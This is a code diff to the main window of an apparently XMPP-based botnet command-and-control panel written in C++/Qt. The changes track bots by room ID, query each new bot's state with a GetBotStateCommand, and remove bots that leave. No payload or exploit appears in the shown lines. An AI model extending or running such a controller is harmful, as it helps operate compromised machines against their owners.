@@ -78,8 +78,6 @@ void MainWindow::readyOnXmppClient()
     qDebug() << "Command && Control ready";
 
     setConnected(true);
-
-    _xmppClient -> sendCommand(GetStatusCommand());
 }
 
 void MainWindow::disconnectedOnXmppClient()
@@ -93,21 +91,32 @@ void MainWindow::responseReceivedOnXmppClient(Message *response)
 {
     qDebug() << "Response received from" << response -> from();
 
-    if(BotStateResponse *botStateResponse = dynamic_cast<BotStateResponse *>(response)) {
-        _centralWidget -> addBot(new Bot(*botStateResponse -> bot()));
-    }
+    if(BotStateResponse *botStateResponse = dynamic_cast<BotStateResponse *>(response))
+        _centralWidget -> addBot(botStateResponse -> from(), new Bot(*botStateResponse -> bot()));
 
     delete response;
 }
 
-void MainWindow::botAddedOnXmppClient(const QString &jid)
+void MainWindow::botAddedOnXmppClient(const QString &roomId)
 {
-    qDebug() << "Bot added:" << jid;
+    if(roomId != _xmppClient -> whoAmIOnRoom()) {
+        qDebug() << "Bot added:" << roomId;
+
+        GetBotStateCommand command;
+
+        command.setTo(roomId);
+
+        _xmppClient -> sendCommand(command);
+    }
 }
 
-void MainWindow::botRemovedOnXmppClient(const QString &jid)
+void MainWindow::botRemovedOnXmppClient(const QString &roomId)
 {
-    qDebug() << "Bot removed:" << jid;
+    if(roomId != _xmppClient -> whoAmIOnRoom()) {
+        qDebug() << "Bot removed:" << roomId;
+
+        _centralWidget -> removeBot(roomId);
+    }
 }
 
 void MainWindow::createWidgets()
